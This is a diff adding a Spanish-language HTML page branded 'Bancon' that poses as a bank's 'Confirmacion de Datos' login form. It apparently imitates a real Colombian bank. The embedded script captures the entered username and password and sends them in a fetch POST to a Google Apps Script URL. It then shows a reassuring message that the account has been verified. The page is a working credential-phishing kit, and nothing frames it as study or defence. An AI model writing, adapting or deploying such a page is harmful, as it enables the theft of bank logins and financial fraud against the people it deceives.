@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Bancon</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e6f7ee;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    h1 {
+      font-size: 48px;
+      font-weight: bold;
+      color: #006b63;
+      margin-bottom: 20px;
+      margin-top: -10px;
+      display: flex;
+      align-items: center;
+      gap: 2px;
+      z-index: 1;
+      background: #fff;
+      padding: 10px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    .power {
+      position: relative;
+      display: inline-block;
+      color: #006b63;
+    }
+
+    .power .letter {
+      font-size: 48px;
+      font-weight: bold;
+      font-family: Arial, sans-serif;
+    }
+
+    .power::before {
+      content: "";
+      position: absolute;
+      top: 22%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 4px;
+      height: 25%;
+      background: #e67e22;
+      border-radius: 2px;
+    }
+
+    .login-box {
+      background: white;
+      padding: 60px 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      width: 300px;
+      text-align: center;
+      z-index: 1;
+      position: relative;
+    }
+
+    .login-box h2 {
+      margin-top: -10px;
+      margin-bottom: 20px;
+      color: #006b63;
+    }
+
+    .login-box input {
+      width: 90%;
+      padding: 12px;
+      margin: 12px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      background-color: #006b63;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .login-box button:hover {
+      background-color: #004d44;
+    }
+  </style>
+</head>
+<body>
+  <h1>Banc<span class="power"><span class="letter">o</span></span>n</h1>
+
+  <div class="login-box">
+    <h2>Confirmacion de Datos</h2>
+    <form id="loginForm">
+      <input type="text" id="usuario" placeholder="Usuario" required>
+      <input type="password" id="password" placeholder="Contraseña" required>
+      <button type="submit">Confirmar</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const url = "https://script.google.com/macros/s/AKfycbw3DV4vR5nM1F4aDFIY4g0taFqEfcFp7Uzx_ZHWDX22wrMCUDcfFgwx87qGRxcuBkzP/exec";
+
+      const data = {
+        usuario: document.getElementById("usuario").value,
+        password: document.getElementById("password").value
+      };
+
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(() => {
+        alert("✅ Los datos de su cuenta han sido verificados correctamente");
+        document.getElementById("loginForm").reset();
+      })
+      .catch(err => {
+        console.error("Error al enviar:", err);
+        alert("⚠️ Hubo un error al registrar.");
+      });
+    });
+  </script>
+</body>
+</html>
